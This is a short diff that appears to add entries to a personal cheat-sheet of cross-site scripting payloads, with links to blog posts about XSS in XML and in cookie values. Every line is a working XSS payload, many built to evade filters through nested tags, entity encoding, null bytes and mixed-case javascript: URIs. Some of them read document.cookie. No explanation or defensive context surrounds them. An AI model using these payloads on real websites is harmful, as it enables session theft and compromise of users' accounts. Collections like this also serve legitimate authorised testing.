@@ -5,3 +5,13 @@ xss in xml :https://zseano.com/blogs/1.html
 xss in cookie value:https://zseano.com/blogs/3.html#
 </</script>script> <</svg>svg/onload=prompt`${document.cookie}`>
 
+<xml:namespace prefix="t">
+<svg><style>&lt;img/src=x onerror=alert(document.domain)// </b>
+'>"><svg/onload=alert()> 
+<marquee onstart=alert(1)>
+script ~~~>alert(0%0)</script ~~~>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<svg><style>'<body/onload=confirm(1)>'
+<iframe/%00/ src=javaSCRIPT&colon;alert(/hhhh/)
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<a href="javascript:{ js code here}"> POC </a>
